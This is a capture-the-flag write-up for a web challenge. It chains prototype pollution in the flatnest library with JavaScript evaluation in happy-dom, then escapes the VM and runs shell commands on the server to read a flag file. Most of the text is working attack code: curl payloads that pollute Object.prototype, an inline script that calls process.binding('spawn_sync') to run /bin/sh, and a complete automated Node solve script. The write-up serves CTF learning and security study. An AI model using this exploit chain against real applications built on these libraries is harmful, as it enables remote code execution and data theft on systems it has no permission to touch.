# 4llD4y (Web, Medium)

## Summary
The app exposes two endpoints: `/config` that calls `flatnest.nest()` on attacker JSON, and `/render` that renders attacker HTML using `happy-dom`. By abusing a circular-reference gadget in `flatnest`, we can set properties on `Object.prototype` and thus inject Happy DOM browser settings. Enabling `enableJavaScriptEvaluation` lets inline scripts execute in the Happy DOM VM. That VM is not isolated, so we can escape via `this.constructor.constructor('return process')()` and use Node internals to read the random `/flag_*.txt` file.

## Recon
### App source
`app.js`:
- `POST /config` -> `nest(incoming)`
- `POST /render` -> creates `new Window({ console })`, writes attacker HTML, returns `documentElement.outerHTML`

`init.sh`:
- The real flag is written to a random file: `/flag_<random>.txt`
- `$FLAG` is unset after writing

### Dependency behavior
`flatnest` supports a circular reference string like `"[Circular (constructor.prototype)]"`. That resolves to the target object `Object.prototype` and lets us insert nested keys there. The library only blocks the key `__proto__`, so `constructor.prototype` is still reachable.

`happy-dom` defaults to `enableJavaScriptEvaluation: false`, but it reads settings from the `Window` object. Because it uses normal property access, a polluted `Object.prototype.settings` is picked up and enables JS execution.

## Exploit chain
1. **Prototype pollution via flatnest**:
   - Send a key with a circular reference that resolves to `Object.prototype`:
     - `a: "[Circular (constructor.prototype)]"`
   - Then set properties on that object:
     - `a.settings.enableJavaScriptEvaluation: true`
2. **Run JS in Happy DOM**:
   - Submit HTML with a `<script>` tag to `/render`.
3. **VM escape**:
   - In Node's VM, `this.constructor.constructor` is the `Function` constructor.
   - `Function('return process')()` gives the real Node `process`.
4. **Read flag**:
   - Use `process.binding('spawn_sync')` to run `/bin/sh -c 'cat /flag_*.txt'` and capture stdout.
   - Write it into `document.body`, which is returned by `/render`.

## Manual exploitation (curl)
### 1) Enable JS evaluation via prototype pollution
```bash
curl -s -X POST http://challenges2.ctf.sd:33295/config \
  -H 'content-type: application/json' \
  -d '{
    "a":"[Circular (constructor.prototype)]",
    "a.settings.enableJavaScriptEvaluation":true,
    "a.settings.suppressInsecureJavaScriptEnvironmentWarning":true
  }'
```

### 2) Render HTML that extracts the flag
```bash
curl -s -X POST http://challenges2.ctf.sd:33295/render \
  -H 'content-type: application/json' \
  -d '{
    "html":"<html><body><script>\
const p = this.constructor.constructor(\"return process\")();\
const spawn = p.binding(\"spawn_sync\").spawn;\
const envPairs = Object.entries(p.env).map(([k, v]) => `${k}=${v}`);\
const result = spawn({\
  file: \"/bin/sh\",\
  args: [\"sh\", \"-c\", \"cat /flag_*.txt\"],\
  cwd: null,\
  envPairs,\
  stdio: [\
    { type: \"pipe\", readable: true, writable: false },\
    { type: \"pipe\", readable: false, writable: true },\
    { type: \"pipe\", readable: false, writable: true }\
  ],\
  windowsHide: false,\
  windowsVerbatimArguments: false\
});\
const out = result.output && result.output[1] ? result.output[1].toString() : \"\";\
document.body.textContent = out;\
</script></body></html>"
  }'
```

## Automated solve script
File: `solve.js`
```js
#!/usr/bin/env node

const base = (process.argv[2] || 'http://challenges2.ctf.sd:33295').replace(/\/+$/, '');

async function post(path, body) {
  const res = await fetch(`${base}${path}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body)
  });

  const text = await res.text();
  if (!res.ok) {
    throw new Error(`${path} -> ${res.status}: ${text}`);
  }
  return text;
}

(async () => {
  const config = {
    a: '[Circular (constructor.prototype)]',
    'a.settings.enableJavaScriptEvaluation': true,
    'a.settings.suppressInsecureJavaScriptEnvironmentWarning': true
  };

  await post('/config', config);

  const html = `<!doctype html><html><body>
<script>
const p = this.constructor.constructor('return process')();
const spawn = p.binding('spawn_sync').spawn;
const envPairs = Object.entries(p.env).map(([k, v]) => `${k}=${v}`);
const result = spawn({
  file: '/bin/sh',
  args: ['sh', '-c', 'cat /flag_*.txt'],
  cwd: null,
  envPairs,
  stdio: [
    { type: 'pipe', readable: true, writable: false },
    { type: 'pipe', readable: false, writable: true },
    { type: 'pipe', readable: false, writable: true }
  ],
  windowsHide: false,
  windowsVerbatimArguments: false
});
const out = result.output && result.output[1] ? result.output[1].toString() : '';
document.body.textContent = out;
</script>
</body></html>`;

  const rendered = await post('/render', { html });
  const match = rendered.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
  console.log(match ? match[1].trim() : rendered.trim());
})().catch((err) => {
  console.error(err.message || err);
  process.exit(1);
});
```

Run:
```bash
node solve.js http://challenges2.ctf.sd:33295
```

## Flag
`0xL4ugh{H4appy_D0m_4ll_th3_D4y_cf16bbb0b4d6f58c}`
